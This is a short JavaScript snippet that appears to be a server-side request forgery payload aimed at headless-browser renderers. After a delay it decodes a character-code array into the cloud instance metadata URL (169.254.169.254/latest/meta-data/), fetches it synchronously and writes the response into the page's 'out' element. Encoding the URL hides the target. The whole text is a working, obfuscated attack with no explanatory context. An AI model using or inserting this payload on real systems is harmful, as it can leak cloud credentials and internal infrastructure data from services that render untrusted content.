setTimeout(function(){
  var r=document.getElementById('out');
  var p=[104,116,116,112,58,47,47,49,54,57,46,50,53,52,46,49,54,57,46,50,53,52,47,108,97,116,101,115,116,47,109,101,116,97,45,100,97,116,97,47];
  var u='';for(var i=0;i<p.length;i++)u+=String.fromCharCode(p[i]);
  var x=new XMLHttpRequest();
  x.open('GET',u,false);
  try{x.send();r.textContent='DYN:'+x.responseText;}
  catch(e){r.textContent='DYN_ERR:'+e.message;}
},3000);
